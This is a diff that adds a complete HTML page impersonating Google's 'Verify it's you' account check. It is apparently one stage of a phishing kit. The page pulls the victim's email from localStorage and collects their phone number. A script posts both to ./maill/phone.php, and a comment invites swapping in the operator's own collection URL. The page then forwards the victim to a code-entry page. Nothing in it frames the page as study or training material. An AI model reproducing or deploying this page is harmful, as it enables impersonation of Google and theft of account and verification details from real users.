@@ -1,0 +1,462 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="icon" href="https://logo.clearbit.com/mail.google.com" type="image/svg+xml">
+    <title>Gmail</title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        body {
+            background: #f0f4f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        main {
+            width: 70%;
+        }
+        .logo img {
+            width: 100%;
+            height: auto;
+        }
+        .logo {
+            width: 78px;
+        }
+        .flexgoogle {
+            display: flex;
+            align-items: baseline;
+            justify-content: space-between;
+            padding: 2rem 3rem;
+            border-radius: 28px;
+            background: #fff;
+            width: 100%;
+        }
+        .side1, .side2 {
+            width: 45%;
+        }
+        .side2 {
+            margin-top: 1rem;
+        }
+        .side1 h1 {
+            color: #1f1f1f;
+            font-size: 34px;
+            font-weight: 400;
+        }
+        .did-floating-label-content { 
+        position:relative; 
+        margin-bottom:20px;
+        width: 81%; 
+        }
+        .did-floating-label {
+            color:rgb(0 0 0 / 60%); 
+            font-size:13px;
+            font-weight:normal;
+            position:absolute;
+            pointer-events:none;
+            left:15px;
+            top:11px;
+            padding:0 5px;
+            background: #fff;
+            transition:0.2s ease all; 
+            -moz-transition:0.2s ease all; 
+            -webkit-transition:0.2s ease all;
+        }
+        .did-floating-input {
+            font-size:12px;
+            display:block;
+            width:100%;
+            /* height:36px; */
+            padding: 19.5px 14px;
+            background: #fff;
+            color: #323840;
+            border: 1px solid rgb(0 0 0 / 60%);
+            border-radius: 4px;
+            box-sizing: border-box;
+            &:focus{
+                outline:none;
+                border: 2px solid #0b57d0;
+                ~ .did-floating-label{
+                top:-8px;
+                font-size:13px;
+                color: #0b57d0;
+                }
+            }
+        }
+        .did-floating-input:not(:placeholder-shown) ~ .did-floating-label {
+        top:-8px;
+        font-size:13px;
+        }
+        .did-floating-select:not([value=""]):valid ~ .did-floating-label {
+        top:-8px;
+        font-size:13px;
+        }
+        .did-floating-select[value=""]:focus ~ .did-floating-label {
+        top:11px;
+        font-size:13px;
+        }
+        .flrvbt {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            justify-content: end;
+            margin-top: 3rem;
+        }
+        a {
+            color: #0b57d0;
+            text-decoration: none;
+            transition: color 0.3s ease;
+            font-weight: 500;
+        }
+        button {
+            padding: 10px 20px;
+            border: none;
+            background: #0b57d0;
+            color: white;
+            border-radius: 20px;
+        }
+
+
+        /* From Uiverse.io by vishnupprajapat */ 
+        .checkbox-wrapper-46  {
+            display: none;
+        }
+        .checkbox-wrapper-46 input[type="checkbox"] {
+        display: none;
+        visibility: hidden;
+        }
+
+        .checkbox-wrapper-46 .cbx {
+        margin: auto;
+        -webkit-user-select: none;
+        user-select: none;
+        cursor: pointer;
+        }
+        .checkbox-wrapper-46 .cbx span {
+        display: inline-block;
+        vertical-align: middle;
+        transform: translate3d(0, 0, 0);
+        }
+        .checkbox-wrapper-46 .cbx span:first-child {
+        position: relative;
+        width: 18px;
+        height: 18px;
+        border-radius: 3px;
+        transform: scale(1);
+        vertical-align: middle;
+        border: 1px solid #9098a9;
+        transition: all 0.2s ease;
+        }
+        .checkbox-wrapper-46 .cbx span:first-child svg {
+        position: absolute;
+        top: 3px;
+        left: 2px;
+        fill: none;
+        stroke: #ffffff;
+        stroke-width: 2;
+        stroke-linecap: round;
+        stroke-linejoin: round;
+        stroke-dasharray: 16px;
+        stroke-dashoffset: 16px;
+        transition: all 0.3s ease;
+        transition-delay: 0.1s;
+        transform: translate3d(0, 0, 0);
+        }
+        .checkbox-wrapper-46 .cbx span:first-child:before {
+        content: "";
+        width: 100%;
+        height: 100%;
+        background: #506eec;
+        display: block;
+        transform: scale(0);
+        opacity: 1;
+        border-radius: 50%;
+        }
+        .checkbox-wrapper-46 .cbx span:last-child {
+        padding-left: 8px;
+        }
+        .checkbox-wrapper-46 .cbx:hover span:first-child {
+        border-color: #506eec;
+        }
+
+        .checkbox-wrapper-46 .inp-cbx:checked + .cbx span:first-child {
+        background: #506eec;
+        border-color: #506eec;
+        animation: wave-46 0.4s ease;
+        }
+        .checkbox-wrapper-46 .inp-cbx:checked + .cbx span:first-child svg {
+        stroke-dashoffset: 0;
+        }
+        .checkbox-wrapper-46 .inp-cbx:checked + .cbx span:first-child:before {
+        transform: scale(3.5);
+        opacity: 0;
+        transition: all 0.6s ease;
+        }
+        @keyframes wave-46 {
+        50% {
+            transform: scale(0.9);
+        }
+        }
+        .side1 #sp {
+            display: inline-flex;
+            gap: 7px;
+            align-items: center;
+            border: 1px solid black;
+            padding: 0px 3px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 600;
+        }
+        #passbox {
+            display: none;
+        }
+        #load {
+            width: 100%;
+            height: 100vh;
+            background: #ccd2dd56;
+            position: fixed;
+            top: 0;
+            display: none;
+        }
+        #waitt {
+            width: 100%;
+            height: 100vh;
+            background: #f0f4f9;
+            position: fixed;
+            top: 0;
+            /* display: none; */
+        }
+        .contw {
+            margin-top: 2rem;
+            background: #64b4ed;
+            color: #323840;
+            width: 100%;
+            padding: 10px;
+        }
+        .errome {
+            color: red;
+            display: block;
+            margin-top: -18px;
+            font-size: 13px;
+        }
+        .side2 p {
+            margin: 1rem 0;
+            font-size: 16px;
+        }
+        .flexcou {
+            display: flex;
+            align-items: baseline;
+            gap: 1rem;
+        }
+        .flexcou select {
+            width: 19%;
+            border: none;
+            padding: 1rem;
+            outline: none;
+            font-size: 10px;
+        }
+        @media screen and (max-width: 768px) {
+            .flexgoogle {
+                flex-direction: column;
+            }
+            body {
+                background: #fff;
+            }
+            .side1, .side2 {
+                width: 100%;
+            }
+            .flexgoogle {
+                display: flex;
+                align-items: baseline;
+                justify-content: space-between;
+                padding: 2rem 2rem;
+                border-radius: 28px;
+                background: #fff;
+                width: 100%;
+                font-family: system-ui;
+               line-height: 27px;
+            }
+            main {
+                width: 100%;
+            }
+            body {
+                display: block;
+            }
+            .side1 h1 {
+                color: #1f1f1f;
+                font-size: 34px;
+                font-weight: 400;
+                margin-bottom: 2rem;
+            }
+            .logo {
+                width: 54px;
+                margin-bottom: 1rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <main>
+        <form id="TETcuYGOc" method="post" action="" class="flexgoogle">
+            <input type="hidden" name="aa" id="emin">
+            <div class="side1">
+                <div class="logo">
+                    <img src="https://logo.clearbit.com/google.com" alt="">
+                </div>
+                <h1 id="well">Verify it's you</h1>
+                <span style="display: block;margin: 10px 0;" id="hidee">To help keep your account safe, Google wants to make sure it’s really you trying to sign in</span>
+                <span id="sp">
+                    <svg aria-hidden="true" class="Qk3oof" fill="currentColor" focusable="false" width="20px" height="20px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path></svg>
+                    <p id="emm"></p>
+                    <div class="svv">
+                        <svg aria-hidden="true" class="Qk3oof u4TTuf" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M7 10l5 5 5-5z"></path></svg>
+                    </div>
+                </span>
+            </div>
+            <div class="side2">
+                <p>Enter a phone number to use for security purposes. This phone number can be used to help verify it’s really you signing into your account.</p>
+                <div class="flexcou">
+                    <select id="country-select" name="country" name="ccode">
+                        <option value="" disabled selected>Loading countries...</option>
+                        <option value="+1" selected>US +1</option>
+                    </select>
+                    <div class="did-floating-label-content" id="emailbox">
+                        <input class="did-floating-input" id="email" type="number" name="bb" required placeholder=" ">
+                        <label class="did-floating-label">Phone number</label>
+                    </div>
+                </div>
+
+                <div class="errome">
+                    
+                </div>
+                <div class="checkbox-wrapper-46" id="checks">
+                    <input type="checkbox" id="cbx-46" class="inp-cbx" />
+                    <label for="cbx-46" class="cbx"
+                        ><span>
+                        <svg viewBox="0 0 12 10" height="10px" width="12px">
+                            <polyline points="1.5 6 4.5 9 10.5 1"></polyline></svg></span
+                        ><span>Show password</span>
+                    </label>
+                </div>
+
+                <a href="#" id="hidee" style="visibility: hidden;"> Forgot email?</a><br><br>
+
+                <p id="hidee" style="visibility: hidden;">Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more about using Guest mode</a></p>
+
+                <div class="flrvbt">
+                    <a href="#" id="fogpass" style="visibility: hidden;">Create account</a>
+                    <button type="submit" id="next">Next</button>
+                </div>
+            </div>
+        </form>
+    </main>
+    <div id="load">
+
+    </div>
+    <div id="waitt" style="display: none;">
+        <div class="contw">Please wait</div>
+    </div>
+    <script>
+       // REST Countries API URL
+const apiUrl = "https://restcountries.com/v3.1/all";
+
+// Get the select element
+const select = document.getElementById("country-select");
+
+// Fetch data from the API
+fetch(apiUrl)
+    .then(response => {
+        if (!response.ok) {
+            throw new Error("Failed to fetch countries.");
+        }
+        return response.json();
+    })
+    .then(countries => {
+        // Sort countries alphabetically by abbreviation
+        countries.sort((a, b) => {
+            const nameA = a.cca2.toUpperCase();
+            const nameB = b.cca2.toUpperCase();
+            return nameA.localeCompare(nameB);
+        });
+
+        // Populate the select dropdown
+        countries.forEach(country => {
+            const abbreviation = country.cca2; // Country abbreviation
+            const callingCode = country.idd?.root + (country.idd?.suffixes?.[0] || ""); // Calling code
+
+            // Only include countries with valid calling codes
+            if (callingCode) {
+                const option = document.createElement("option");
+                option.value = callingCode; // Set the value to the country abbreviation
+                option.textContent = `${abbreviation} ${callingCode}`; // Show abbreviation and calling code
+                select.appendChild(option);
+            }
+        });
+
+        // Remove the "Loading" placeholder
+        if (select.options[0].textContent === "Loading countries...") {
+            select.options[0].remove();
+        }
+    })
+    .catch(error => {
+        console.error("Error fetching countries:", error);
+        select.options[0].textContent = "Failed to load countries.";
+    });
+
+    </script>
+    <script>
+        // setTimeout(() => {
+        //     document.getElementById("waitt").style.display = "none";
+        // }, 10000);
+        const emh = localStorage.getItem('emailg');
+        document.getElementById("emm").textContent = emh;
+        document.getElementById("emin").value = emh;
+
+        var formSubmitted = 0;
+
+
+    document.getElementById("TETcuYGOc").addEventListener("submit", function (event) {
+        // const asval = document.getElementById("asval").value;
+            document.getElementById("load").style.display = "block";
+        event.preventDefault();
+
+        formSubmitted++;
+        
+        var inputs = document.querySelectorAll('input[required]');
+        for (var i = 0; i < inputs.length; i++) {
+            if (!inputs[i].value.trim()) {
+                alert("Please fill in all fields.");
+                return;
+            }
+        }
+
+        var formData = new FormData(this);
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "./maill/phone.php", true); // your php url here eg http://yourdomain.com/result.php
+
+        xhr.onreadystatechange = function () {
+            if (xhr.readyState == 4 && xhr.status == 200) {
+                // const dd = localStorage.getItem("userDomain")
+                // console.log(xhr.responseText);
+                // localStorage.setItem("emailg", input)
+
+                if (formSubmitted >= 1) {
+                    setInterval(() => {
+                        document.getElementById("load").style.display = "none";
+                        // document.getElementById("password").value = "";
+                        window.location.href = `./code.html`;
+                    }, 2000);
+                } 
+            }
+        };
+
+        xhr.send(formData);
+    });
+    </script>
+</body>
+</html>
